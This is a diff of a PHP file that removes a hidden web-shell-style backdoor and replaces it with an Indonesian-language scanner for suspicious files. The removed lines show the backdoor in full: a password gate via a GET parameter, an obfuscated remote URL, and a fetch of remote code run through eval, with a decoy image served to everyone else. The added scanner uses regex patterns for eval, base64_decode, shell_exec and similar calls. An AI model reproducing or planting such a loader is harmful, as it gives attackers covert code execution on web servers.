@@ -1,77 +1,54 @@
 <?php
 
-error_reporting(0);
-ini_set('display_errors', 0);
-
-session_start();
-
-function is_logged_in() {
-    return isset($_SESSION['R10TXER']);
-}
-
-function login($password) {
-    $valid_password_hash = '$2y$10$g07xSIOFdkkB8cxArAVOCeyQKlX3oECoUoUoNUfX28H8iD1097qoG';
-    if (password_verify($password, $valid_password_hash)) {
-        $_SESSION['R10TXER'] = 'user';
-        return true;
-    } else {
-        return false;
+function is_suspicious($content) {
+    $patterns = [
+        '/eval\s*\(/i',
+        '/base64_decode\s*\(/i',
+        '/gzinflate\s*\(/i',
+        '/shell_exec\s*\(/i',
+        '/system\s*\(/i',
+        '/exec\s*\(/i',
+        '/passthru\s*\(/i',
+        '/`.*?`/', // backtick execution
+    ];
+    foreach ($patterns as $pattern) {
+        if (preg_match($pattern, $content)) {
+            return true;
+        }
     }
+    return false;
 }
 
-function logout() {
-    unset($_SESSION['R10TXER']);
-}
+function scan_dir($dir) {
+    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
+    $suspicious_files = [];
 
-if (isset($_GET['password'])) {
-    $password = $_GET['password'];
-    if (login($password)) {
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
-    } else {
-        $error_message = "Password salah!";
-        echo '<script>alert("'.$error_message.'");</script>';
+    foreach ($rii as $file) {
+        if ($file->isDir()) continue;
+        $filepath = $file->getPathname();
+        $ext = pathinfo($filepath, PATHINFO_EXTENSION);
+
+        if (in_array($ext, ['php', 'txt', 'phtml'])) {
+            $content = @file_get_contents($filepath);
+            if ($content && is_suspicious($content)) {
+                $suspicious_files[] = $filepath;
+            }
+        }
     }
+
+    return $suspicious_files;
 }
 
-function getContent($url) {
-    $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, $url);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
-    $content = curl_exec($curl);
-    curl_close($curl);
-    if ($content === false) {
-        $content = file_get_contents($url);
-    }
-    return $content;
-}
+echo "<h2>🔍 Scan File Mencurigakan</h2>";
+$found = scan_dir(__DIR__);
 
-function encode_url($url) {
-    $encoded_url = base64_encode($url);
-    $encoded_url = str_rot13($encoded_url);
-    return urlencode($encoded_url);
-}
-
-function decode_url($encoded_url) {
-    $decoded_url = str_rot13(urldecode($encoded_url));
-    return base64_decode($decoded_url);
-}
-
-$encoded_url = 'Njg3NDc0NzA3MzNhMmYyZjcyNjE3NzJlNjc2OTc0Njg3NTYyNzU3MzY1NzI2MzZmNmU3NDY1NmU3NDJlNjM2ZjZkMmY2NTYxNjc2YzY1NzMzMjMyMzcyZjYzNmM2MTc1NjQ2OTYxMmY2ZDYxNjk2ZTJmNjE2YzY1NzgyZTcwNjg3MAo';
-$decoded_url = decode_url($encoded_url);
-if (is_logged_in()) {
-    if ($decoded_url) {
-        $content = getContent($decoded_url);
-        eval('?>' . $content);
-        exit;
-    }
+if (empty($found)) {
+    echo "<p style='color: green;'>Tidak ada file mencurigakan ditemukan ✅</p>";
 } else {
-    // Menampilkan gambar default jika tidak ada login
-    header('Content-Type: image/jpeg');
-    $image_path = 'https://res.cloudinary.com/momentum-media-group-pty-ltd/image/upload/c_fill,q_auto:best,f_auto,e_unsharp_mask:80,w_828,h_400/ALPHV_FBI_Seized_cmqjcf';
-    readfile($image_path);
+    echo "<p style='color: red;'>Ditemukan file mencurigakan:</p><ul>";
+    foreach ($found as $file) {
+        echo "<li><code>" . htmlspecialchars($file) . "</code></li>";
+    }
+    echo "</ul>";
 }
-
 ?>
